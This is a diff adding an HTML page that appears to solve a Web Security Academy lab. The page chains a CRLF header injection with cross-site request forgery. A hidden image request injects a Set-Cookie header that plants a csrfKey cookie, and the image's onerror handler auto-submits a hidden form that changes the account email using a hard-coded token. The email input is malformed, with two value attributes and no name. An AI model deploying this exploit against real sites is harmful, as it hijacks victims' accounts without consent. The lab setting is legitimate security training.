@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <h1>Hello World</h1>
+        <form action="https://0af9002c03013592c2f7ed3a00c40099.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
+        <input type="hidden" value="email" value="FakeEmail@mail.com" >
+        <input type="hidden" name="csrf" value="nhdyMnsifdQiXTnjauRjmztCjsouXReP">
+        <input type="submit" value="Submit request">
+    </form>
+    <img style="display:none"src="https://0af9002c03013592c2f7ed3a00c40099.web-security-academy.net/?search=beannie%0d%0aSet-Cookie:%20csrfKey=wSPfJbpgS468j6AXcy4D5zG05ScSnBGP%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    </body>
+</html>
+
